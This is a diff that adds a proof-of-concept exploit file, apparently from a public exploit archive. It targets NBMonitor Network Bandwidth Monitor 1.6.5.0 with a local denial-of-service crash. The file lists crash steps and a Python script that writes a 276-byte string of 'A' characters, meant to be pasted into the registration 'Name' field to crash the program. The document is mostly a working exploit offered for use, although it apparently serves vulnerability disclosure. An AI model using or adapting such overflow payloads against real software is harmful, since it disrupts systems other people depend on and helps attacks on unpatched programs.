@@ -1,0 +1,25 @@
+# Exploit Title: NBMonitor Network Bandwidth Monitor 1.6.5.0 - 'Name' Denial of Service (PoC)
+# Author: Luis Martinez
+# Date: 2018-12-27
+# Vendor Homepage: www.nsauditor.com
+# Software Link : http://www.nbmonitor.com/downloads/nbmonitor_setup.exe
+# Tested Version: 1.6.5.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python NBMonitor_1.6.5.0.py
+# 2.- Open NBMonitor_1.6.5.0.txt and copy content to clipboard
+# 3.- Open NBMonitor
+# 4.- Register -> Enter Registration Code
+# 5.- Paste ClipBoard on "Name:"
+# 6.- Key: -> 1
+# 7.- OK
+# 8.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 276
+f = open ("NBMonitor_1.6.5.0.txt", "w")
+f.write(buffer)
+f.close()
